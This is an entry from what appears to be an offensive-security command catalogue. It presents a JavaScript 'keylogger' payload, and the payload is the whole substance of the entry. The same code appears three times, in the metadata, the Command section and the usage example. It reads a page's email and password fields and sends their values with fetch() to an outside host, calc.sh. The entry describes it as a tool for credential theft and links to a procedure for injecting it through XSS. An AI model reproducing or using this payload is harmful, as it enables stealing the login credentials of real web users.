---
data: >-
  setTimeout(function(){ a = document.getElementsByName('password')[0]; b =
  document.getElementsByName('email')[0]; function f(){
  fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  } a.form.onclick=f; a.onchange=f; b.onchange=f; a.oninput=f; b.oninput=f;
  },1000)
tags:
  - keylogger
  - javascript
type: command
executor: javascript
platforms:
  - Web
id: 3cecc996-e2d4-40db-8f25-8ffdf322a5c5
created_at: '2025-12-13T23:56:20.358Z'
updated_at: '2025-12-13T23:56:20.358Z'
verified: false
validated: true
submitted: true
---
# javascript-keylogger-payload

## Command

```javascript
setTimeout(function(){ a = document.getElementsByName('password')[0]; b = document.getElementsByName('email')[0]; function f(){ fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`); } a.form.onclick=f; a.onchange=f; b.onchange=f; a.oninput=f; b.oninput=f; },1000)
```

## Description

JavaScript keylogger payload for credential theft.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | N/A | No |

## Examples

### Basic Usage

```javascript
setTimeout(function(){ a = document.getElementsByName('password')[0]; b = document.getElementsByName('email')[0]; function f(){ fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`); } a.form.onclick=f; a.onchange=f; b.onchange=f; a.oninput=f; b.oninput=f; },1000)
```

## Expected Output

Exfiltrates email and password to calc.sh

## Related

- [[procedures/Inject-Keylogger-Payload-via-Smuggled-XSS]]
